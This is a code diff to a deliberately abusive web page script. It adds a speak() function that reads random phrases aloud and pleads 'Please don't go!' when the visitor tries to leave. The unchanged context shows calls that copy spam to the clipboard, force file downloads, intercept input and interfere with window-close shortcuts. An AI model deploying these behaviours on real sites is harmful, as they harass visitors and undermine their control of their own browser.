@@ -195,6 +195,7 @@ function init () {
 
     focusWindows()
     copySpamToClipboard()
+    speak()
 
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
@@ -221,6 +222,7 @@ function initChildWindow () {
   startVideo()
   detectWindowClose()
   triggerFileDownload()
+  speak()
 
   interceptUserInput(event => {
     triggerFileDownload()
@@ -284,6 +286,7 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
+    speak('Please don\'t go!')
     event.returnValue = true
   })
 }
@@ -454,6 +457,11 @@ function triggerFileDownload () {
   a.href = fileName
   a.download = fileName
   a.click()
+}
+
+function speak (phrase) {
+  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
+  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
 }
 
 /**
